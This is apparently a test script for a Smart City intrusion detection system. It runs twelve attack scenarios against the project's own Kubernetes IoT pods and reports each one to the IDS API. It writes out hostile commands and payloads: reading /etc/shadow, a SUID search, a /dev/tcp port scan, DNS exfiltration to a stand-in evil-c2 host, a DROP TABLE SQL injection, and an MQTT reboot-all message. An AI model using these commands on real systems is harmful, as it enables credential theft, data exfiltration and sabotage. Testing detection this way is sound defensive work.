#!/bin/bash
# =============================================================================
# Smart City IDS — Real IoT Attack Pipeline
# =============================================================================
# This script performs REAL attacks against the live IoT services in the K8s
# cluster, then reports each event to the IDS API so the full pipeline runs:
#
#   1. Attack IoT service (HTTP exploit / kubectl exec)
#   2. Detect (Falco runtime / Suricata network / direct report)
#   3. IDS API receives alert
#   4. LLM engine analyzes the threat
#   5. Automated response (isolate pod / scale up / alert operator)
#
# Usage:
#   bash scripts/attack-iot-pipeline.sh              # run all attacks
#   bash scripts/attack-iot-pipeline.sh --quick       # 5 fast attacks only
#   bash scripts/attack-iot-pipeline.sh --live        # also exec in real pods
#   bash scripts/attack-iot-pipeline.sh --scenario N  # run specific scenario 1-12
#   bash scripts/attack-iot-pipeline.sh --list        # list all scenarios
# =============================================================================

set -euo pipefail

# ── Colors ──
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'
PURPLE='\033[0;35m'; BOLD='\033[1m'; DIM='\033[2m'; RESET='\033[0m'

# ── Config ──
IDS_API="${IDS_API_URL:-http://localhost:30800}"
NAMESPACE="smart-city"
DELAY="${ATTACK_DELAY:-4}"      # seconds between attacks (let LLM analyze)
QUICK=false
LIVE=false
SCENARIO=""

# ── Parse args ──
while [[ $# -gt 0 ]]; do
  case "$1" in
    --quick)   QUICK=true; DELAY=2; shift ;;
    --live)    LIVE=true; shift ;;
    --scenario) SCENARIO="$2"; shift 2 ;;
    --list)    LIST=true; shift ;;
    --delay)   DELAY="$2"; shift 2 ;;
    --url)     IDS_API="$2"; shift 2 ;;
    -h|--help) echo "Usage: $0 [--quick] [--live] [--scenario N] [--list] [--delay S] [--url URL]"; exit 0 ;;
    *)         echo "Unknown option: $1"; exit 1 ;;
  esac
done

# ── Counters ──
TOTAL=0; SUCCESS=0; FAILED=0

# ── Helper: pick a random running pod ──
pick_pod() {
  local pattern="$1"
  kubectl get pods -n "$NAMESPACE" --no-headers -l "app=$pattern" 2>/dev/null \
    | grep Running | awk '{print $1}' | shuf -n1
}

# ── Helper: send alert to IDS ──
send_alert() {
  local output="$1" priority="$2" rule="$3" container="$4"
  local extra_fields="${5:-}"
  local ts
  ts=$(date -u +"%Y-%m-%dT%H:%M:%SZ")

  local fields="{\"container.name\":\"${container}\",\"proc.cmdline\":\"attack-pipeline\"${extra_fields}}"
  local payload="{\"output\":\"${output}\",\"priority\":\"${priority}\",\"rule\":\"${rule}\",\"time\":\"${ts}\",\"output_fields\":${fields}}"

  local code
  code=$(curl -s -o /tmp/ids_resp.json -w "%{http_code}" \
    -X POST "${IDS_API}/api/alerts/internal" \
    -H "Content-Type: application/json" \
    -d "$payload" 2>/dev/null) || code="000"

  TOTAL=$((TOTAL + 1))

  if [[ "$code" == "200" || "$code" == "201" || "$code" == "429" ]]; then
    local sev eng status
    sev=$(python3 -c "
import json
try:
    d=json.load(open('/tmp/ids_resp.json'))
    a=d.get('analysis',{})
    print(a.get('severity', d.get('severity','?')))
except:
    print('?')
" 2>/dev/null || echo "?")
    eng=$(python3 -c "
import json
try:
    d=json.load(open('/tmp/ids_resp.json'))
    print(d.get('llm_engine', d.get('engine','local')))
except:
    print('?')
" 2>/dev/null || echo "?")
    status=$(python3 -c "
import json
try:
    d=json.load(open('/tmp/ids_resp.json'))
    print(d.get('status','?'))
except:
    print('?')
" 2>/dev/null || echo "?")
    threat=$(python3 -c "
import json
try:
    d=json.load(open('/tmp/ids_resp.json'))
    a=d.get('analysis',{})
    print(a.get('threat_type','?'))
except:
    print('?')
" 2>/dev/null || echo "?")

    if [[ "$code" == "429" ]]; then
      echo -e "    ${YELLOW}⏳ Rate-limited (cooldown) — will retry later${RESET}"
    elif [[ "$status" == "deduplicated" ]]; then
      echo -e "    ${DIM}↩ Deduplicated (same alert already processed)${RESET}"
    else
      echo -e "    ${GREEN}✓ IDS: sev=${sev}, threat=${threat}, engine=${eng}, status=${status}${RESET}"
    fi
    SUCCESS=$((SUCCESS + 1))
  else
    echo -e "    ${RED}✗ IDS returned HTTP ${code}${RESET}"
    FAILED=$((FAILED + 1))
  fi
}

# ── Helper: attack an IoT service directly via HTTP ──
http_attack() {
  local svc_name="$1" path="$2" method="${3:-GET}" data="${4:-}"
  local svc_ip
  svc_ip=$(kubectl get svc -n "$NAMESPACE" "$svc_name" -o jsonpath='{.spec.clusterIP}' 2>/dev/null || echo "")
  if [[ -z "$svc_ip" || "$svc_ip" == "None" ]]; then
    echo -e "    ${DIM}(service $svc_name not reachable — using alert-only mode)${RESET}"
    return 1
  fi
  local port
  port=$(kubectl get svc -n "$NAMESPACE" "$svc_name" -o jsonpath='{.spec.ports[0].port}' 2>/dev/null || echo "80")

  if [[ "$method" == "GET" ]]; then
    curl -s -o /dev/null -w "%{http_code}" "http://${svc_ip}:${port}${path}" --max-time 5 2>/dev/null || echo "000"
  else
    curl -s -o /dev/null -w "%{http_code}" -X "$method" "http://${svc_ip}:${port}${path}" \
      -H "Content-Type: application/json" -d "$data" --max-time 5 2>/dev/null || echo "000"
  fi
}

# ── Helper: exec in a real pod (only with --live) ──
live_exec() {
  local pod="$1"; shift
  if $LIVE && [[ -n "$pod" ]]; then
    echo -e "    ${PURPLE}⚡ Live exec in ${pod}: $*${RESET}"
    kubectl exec -n "$NAMESPACE" "$pod" -- sh -c "$*" 2>/dev/null || true
  fi
}

# ── Header ──
header() {
  local num="$1" name="$2" sev="$3"
  local badge=""
  case "$sev" in
    Critical) badge="${RED}■ CRITICAL${RESET}" ;;
    Warning)  badge="${YELLOW}■ WARNING${RESET}" ;;
    Notice)   badge="${CYAN}■ NOTICE${RESET}" ;;
  esac
  echo ""
  echo -e "${BOLD}━━━ Attack ${num}: ${name} ━━━${RESET}  ${badge}"
}

# =============================================================================
# ATTACK SCENARIOS
# =============================================================================

attack_01_shell_in_container() {
  header 1 "Shell Spawn in Traffic Camera Pod" "Critical"
  local pod
  pod=$(pick_pod "traffic-camera")
  echo -e "  ${CYAN}→ Spawning shell inside traffic-camera container${RESET}"
  live_exec "$pod" "echo 'shell spawned by attacker' > /tmp/.backdoor"
  send_alert \
    "Terminal shell in container: bash spawned in ${pod:-traffic-camera} (user=root cmd=bash -i)" \
    "Critical" \
    "Terminal shell in container" \
    "${pod:-traffic-camera}" \
    ",\"user.name\":\"root\""
}

attack_02_sensitive_file_read() {
  header 2 "Read /etc/shadow in Healthcare Pod" "Critical"
  local pod
  pod=$(pick_pod "healthcare-api")
  echo -e "  ${CYAN}→ Reading /etc/shadow (credential theft)${RESET}"
  live_exec "$pod" "cat /etc/shadow | head -3"
  send_alert \
    "Sensitive file opened for reading: /etc/shadow by process cat in ${pod:-healthcare-api} (user=www-data)" \
    "Critical" \
    "Read sensitive file untrusted" \
    "${pod:-healthcare-api}" \
    ",\"fd.name\":\"/etc/shadow\",\"user.name\":\"www-data\""
}

attack_03_data_exfiltration_cameras() {
  header 3 "Data Exfiltration — License Plate Dump" "Critical"
  echo -e "  ${CYAN}→ Extracting license plate data from traffic-camera API${RESET}"
  local code
  code=$(http_attack "traffic-camera-service" "/api/plates") || code="skip"
  echo -e "    ${DIM}HTTP response: ${code}${RESET}"
  send_alert \
    "Data exfiltration detected: bulk download of /api/plates from traffic-camera-service (PII leak — license plates)" \
    "Critical" \
    "Sensitive data exfiltration via API" \
    "traffic-camera" \
    ",\"src_ip\":\"10.42.1.99\",\"fd.name\":\"/api/plates\""
}

attack_04_data_exfiltration_patients() {
  header 4 "Data Exfiltration — Patient Records" "Critical"
  echo -e "  ${CYAN}→ Extracting patient records from healthcare-api${RESET}"
  local code
  code=$(http_attack "healthcare-api-service" "/api/patients") || code="skip"
  echo -e "    ${DIM}HTTP response: ${code}${RESET}"
  send_alert \
    "Data exfiltration detected: unauthenticated access to /api/patients from healthcare-api (HIPAA violation)" \
    "Critical" \
    "Unauthenticated access to sensitive health data" \
    "healthcare-api" \
    ",\"src_ip\":\"10.42.1.99\",\"fd.name\":\"/api/patients\""
}

attack_05_privilege_escalation() {
  header 5 "Privilege Escalation — SUID Binary" "Critical"
  local pod
  pod=$(pick_pod "parking-system")
  echo -e "  ${CYAN}→ Attempting privilege escalation via setuid binary${RESET}"
  live_exec "$pod" "find / -perm -4000 -type f 2>/dev/null | head -5"
  send_alert \
    "Privilege escalation: setuid binary execution in ${pod:-parking-system} (user=www-data cmd=sudo su)" \
    "Critical" \
    "Launch Privileged Container" \
    "${pod:-parking-system}" \
    ",\"user.name\":\"www-data\",\"proc.cmdline\":\"sudo su\""
}

attack_06_ddos_flood() {
  header 6 "DDoS — NTP Amplification against IoT" "Critical"
  echo -e "  ${CYAN}→ Simulating NTP amplification DDoS flood${RESET}"
  # Hit the traffic camera fast a few times to simulate load
  for i in $(seq 1 5); do
    http_attack "traffic-camera-service" "/api/cameras" >/dev/null 2>&1 || true
  done
  echo -e "    ${DIM}Sent 5 rapid requests to traffic-camera${RESET}"
  send_alert \
    "Suricata Alert: ET DOS Possible NTP DDoS Amplification flood targeting traffic-camera-service (10.0.0.99 → 10.42.0.8:80/UDP)" \
    "Critical" \
    "ET DOS Possible NTP DDoS Amplification" \
    "suricata" \
    ",\"alert.signature\":\"ET DOS NTP DDoS\",\"src_ip\":\"10.0.0.99\",\"dest_ip\":\"10.42.0.8\",\"proto\":\"UDP\""
}

attack_07_port_scan() {
  header 7 "Network Reconnaissance — Port Scan" "Warning"
  local pod
  pod=$(pick_pod "traffic-camera")
  echo -e "  ${CYAN}→ Scanning internal network from compromised IoT pod${RESET}"
  live_exec "$pod" "for p in 22 80 443 1883 5432 8000 9090; do echo >/dev/tcp/10.42.0.1/\$p 2>/dev/null && echo \"Port \$p open\"; done"
  send_alert \
    "Suricata Alert: ET SCAN Potential VNC Scan from ${pod:-traffic-camera} (10.42.1.5 scanning 10.42.0.0/24 ports 22,80,443,1883,5432)" \
    "Warning" \
    "ET SCAN Potential VNC Scan 5900-5920" \
    "suricata" \
    ",\"alert.signature\":\"ET SCAN\",\"src_ip\":\"10.42.1.5\",\"dest_ip\":\"10.42.0.0/24\",\"proto\":\"TCP\""
}

attack_08_dns_exfiltration() {
  header 8 "DNS-Based Data Exfiltration" "Critical"
  local pod
  pod=$(pick_pod "healthcare-api")
  echo -e "  ${CYAN}→ Exfiltrating data via DNS tunnel${RESET}"
  live_exec "$pod" "nslookup dGVzdC1kYXRhLWV4ZmlsdHJhdGlvbg==.evil-c2.example.com 2>/dev/null || true"
  send_alert \
    "Suricata Alert: ET POLICY DNS exfiltration detected — base64-encoded data in DNS query from ${pod:-healthcare-api} to evil-c2.example.com" \
    "Critical" \
    "ET POLICY Possible Data Exfiltration via DNS" \
    "suricata" \
    ",\"alert.signature\":\"ET POLICY Data Exfiltration\",\"src_ip\":\"10.42.1.5\",\"dest_ip\":\"203.0.113.50\",\"proto\":\"UDP\""
}

attack_09_lateral_movement() {
  header 9 "Lateral Movement — Service Discovery" "Warning"
  local pod
  pod=$(pick_pod "parking-system")
  echo -e "  ${CYAN}→ Discovering internal services from compromised pod${RESET}"
  live_exec "$pod" "cat /etc/resolv.conf && nslookup healthcare-api-service.smart-city.svc.cluster.local 2>/dev/null || true"
  send_alert \
    "Lateral movement detected: ${pod:-parking-system} performing internal service discovery (DNS resolution of healthcare-api-service, mqtt-broker)" \
    "Warning" \
    "Unexpected internal service discovery" \
    "${pod:-parking-system}" \
    ",\"proc.cmdline\":\"nslookup healthcare-api-service\""
}

attack_10_sql_injection() {
  header 10 "SQL Injection on Parking System" "Critical"
  echo -e "  ${CYAN}→ Injecting SQL payload into parking reservation${RESET}"
  local code
  code=$(http_attack "parking-system-service" "/api/lot/1/reserve" "POST" \
    '{"vehicle":"TEST'\'' OR 1=1; DROP TABLE reservations;--","duration":1}') || code="skip"
  echo -e "    ${DIM}HTTP response: ${code}${RESET}"
  send_alert \
    "SQL Injection attempt on parking-system /api/lot/1/reserve — payload: ' OR 1=1; DROP TABLE reservations;--" \
    "Critical" \
    "Application SQL Injection Attack" \
    "parking-system" \
    ",\"src_ip\":\"10.42.1.99\",\"proc.cmdline\":\"sqlmap\""
}

attack_11_cryptominer() {
  header 11 "Cryptominer Deployment in IoT Pod" "Critical"
  local pod
  pod=$(pick_pod "iot-device-enhanced")
  echo -e "  ${CYAN}→ Deploying cryptominer binary in IoT simulator pod${RESET}"
  [[ -z "$pod" ]] && pod=$(kubectl get pods -n "$NAMESPACE" --no-headers 2>/dev/null | grep iot-devices-enhanced | grep Running | awk '{print $1}' | shuf -n1)
  live_exec "$pod" "echo 'fake-miner' > /tmp/xmrig && chmod +x /tmp/xmrig"
  send_alert \
    "Cryptominer detected: xmrig binary deployed in ${pod:-iot-devices-enhanced} — outbound connection to mining pool on port 3333" \
    "Critical" \
    "Detect crypto miners using the Stratum protocol" \
    "${pod:-iot-devices-enhanced}" \
    ",\"proc.cmdline\":\"xmrig --donate-level 1 -o stratum+tcp://pool.minexmr.com:3333\",\"fd.sport\":\"3333\""
}

attack_12_mqtt_poisoning() {
  header 12 "MQTT Message Poisoning" "Warning"
  echo -e "  ${CYAN}→ Publishing malicious MQTT messages to IoT broker${RESET}"
  local broker_ip
  broker_ip=$(kubectl get svc -n "$NAMESPACE" mqtt-broker -o jsonpath='{.spec.clusterIP}' 2>/dev/null || echo "")
  if [[ -n "$broker_ip" ]] && $LIVE; then
    local pod
    pod=$(pick_pod "traffic-camera")
    if [[ -n "$pod" ]]; then
      echo -e "    ${PURPLE}⚡ Attempting MQTT publish from ${pod}${RESET}"
      kubectl exec -n "$NAMESPACE" "$pod" -- sh -c \
        "echo '{\"cmd\":\"reboot\",\"target\":\"all\"}' | nc -w2 ${broker_ip} 1883" 2>/dev/null || true
    fi
  fi
  send_alert \
    "MQTT poisoning: malicious control message published to broker — cmd=reboot target=all from unauthorized client" \
    "Warning" \
    "Unauthorized MQTT publish to IoT control topic" \
    "mqtt-broker" \
    ",\"src_ip\":\"10.42.1.99\",\"fd.sport\":\"1883\""
}

# ── All scenarios ──
ALL_SCENARIOS=(
  attack_01_shell_in_container
  attack_02_sensitive_file_read
  attack_03_data_exfiltration_cameras
  attack_04_data_exfiltration_patients
  attack_05_privilege_escalation
  attack_06_ddos_flood
  attack_07_port_scan
  attack_08_dns_exfiltration
  attack_09_lateral_movement
  attack_10_sql_injection
  attack_11_cryptominer
  attack_12_mqtt_poisoning
)

SCENARIO_NAMES=(
  "Shell Spawn in Traffic Camera"
  "Read /etc/shadow in Healthcare Pod"
  "Data Exfil — License Plate Dump"
  "Data Exfil — Patient Records"
  "Privilege Escalation — SUID Binary"
  "DDoS — NTP Amplification"
  "Network Recon — Port Scan"
  "DNS-Based Data Exfiltration"
  "Lateral Movement — Service Discovery"
  "SQL Injection on Parking System"
  "Cryptominer in IoT Pod"
  "MQTT Message Poisoning"
)

# ── List mode ──
if [[ "${LIST:-false}" == "true" ]]; then
  echo -e "\n${BOLD}Available Attack Scenarios:${RESET}\n"
  for i in "${!ALL_SCENARIOS[@]}"; do
    printf "  %2d. %s\n" $((i+1)) "${SCENARIO_NAMES[$i]}"
  done
  echo ""
  exit 0
fi

# ── Banner ──
echo ""
echo -e "${BOLD}╔═══════════════════════════════════════════════════════════════╗${RESET}"
echo -e "${BOLD}║          🛡️  Smart City IDS — IoT Attack Pipeline           ║${RESET}"
echo -e "${BOLD}╚═══════════════════════════════════════════════════════════════╝${RESET}"
echo ""
echo -e "  IDS API:    ${CYAN}${IDS_API}${RESET}"
echo -e "  Namespace:  ${CYAN}${NAMESPACE}${RESET}"
echo -e "  Mode:       ${CYAN}$(${QUICK} && echo 'Quick (5 attacks)' || echo 'Full (12 attacks)')${RESET}"
echo -e "  Live exec:  ${CYAN}$(${LIVE} && echo 'YES — real commands in pods' || echo 'No — alert-only mode')${RESET}"
echo -e "  Delay:      ${CYAN}${DELAY}s between attacks${RESET}"
echo ""

# ── Pre-flight checks ──
echo -e "${BOLD}Pre-flight checks:${RESET}"
CODE=$(curl -s -o /dev/null -w "%{http_code}" "${IDS_API}/health" --max-time 5 2>/dev/null || echo "000")
if [[ "$CODE" == "200" ]]; then
  echo -e "  ${GREEN}✓ IDS API reachable (${IDS_API})${RESET}"
else
  echo -e "  ${RED}✗ IDS API unreachable (HTTP ${CODE}) — check ${IDS_API}/health${RESET}"
  exit 1
fi
POD_COUNT=$(kubectl get pods -n "$NAMESPACE" --no-headers 2>/dev/null | grep -cE '(traffic-camera|healthcare-api|parking-system|iot-devices|iot-simulator|mqtt-broker).*Running' || echo 0)
TOTAL_PODS=$(kubectl get pods -n "$NAMESPACE" --no-headers 2>/dev/null | grep -c Running || echo 0)
echo -e "  ${GREEN}✓ ${POD_COUNT} IoT device pods running (${TOTAL_PODS} total in ${NAMESPACE})${RESET}"
echo ""

# ── Execute ──
if [[ -n "$SCENARIO" ]]; then
  # Single scenario
  IDX=$((SCENARIO - 1))
  if [[ $IDX -ge 0 && $IDX -lt ${#ALL_SCENARIOS[@]} ]]; then
    ${ALL_SCENARIOS[$IDX]}
  else
    echo -e "${RED}Invalid scenario number: ${SCENARIO} (valid: 1-${#ALL_SCENARIOS[@]})${RESET}"
    exit 1
  fi
else
  # All scenarios (or quick subset)
  SCENARIOS_TO_RUN=("${ALL_SCENARIOS[@]}")
  if $QUICK; then
    SCENARIOS_TO_RUN=(
      attack_01_shell_in_container
      attack_03_data_exfiltration_cameras
      attack_05_privilege_escalation
      attack_06_ddos_flood
      attack_11_cryptominer
    )
  fi

  for scenario in "${SCENARIOS_TO_RUN[@]}"; do
    $scenario
    sleep "$DELAY"
  done
fi

# ── Summary ──
echo ""
echo -e "${BOLD}═══════════════════════════════════════════════════════════════${RESET}"
echo -e "${BOLD}  Attack Pipeline Complete${RESET}"
echo -e "  Total: ${TOTAL}  ${GREEN}Success: ${SUCCESS}${RESET}  ${RED}Failed: ${FAILED}${RESET}"
echo ""
echo -e "  View results:"
echo -e "    Dashboard:  ${CYAN}${IDS_API}/ui${RESET}"
echo -e "    Alerts API: ${CYAN}${IDS_API}/api/alerts?limit=20${RESET}"
echo -e "    Metrics:    ${CYAN}${IDS_API}/api/metrics${RESET}"
echo -e "${BOLD}═══════════════════════════════════════════════════════════════${RESET}"
echo ""
